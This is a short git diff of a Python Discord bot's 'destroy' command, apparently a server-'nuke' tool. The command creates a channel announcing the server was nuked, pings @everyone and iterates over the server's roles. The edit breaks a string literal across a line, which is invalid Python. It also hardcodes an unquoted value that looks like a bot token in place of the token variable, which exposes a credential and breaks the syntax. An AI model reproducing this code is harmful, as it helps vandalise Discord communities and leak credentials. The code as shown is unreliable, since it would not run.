@@ -155,7 +155,8 @@ async def destroy(ctx):
         except:
             pass
         guild = ctx.message.guild
-        channel = await guild.create_text_channel("Nuked By Social's Bot! Check Dms")
+        channel = await guild.create_text_channel("Hii angel :>
+                                                  ")
         await channel.send(" @everyone GGGs Guys This Is Kinda Sad But It Is What It Is Am I Right?")
         await channel.send(embed=embed)
     for role in list(ctx.guild.roles):
@@ -211,5 +212,5 @@ async def info(ctx, member: discord.Member=None):
 keep_alive.keep_alive()
 
 
-client.run(token)
+client.run(OTA2NzAwNjUyNDA5OTQyMDE2.YYccyQ.JpQHywTBwWaACkPHq0rS8jcGhDk)
 # Place your Bot's token here
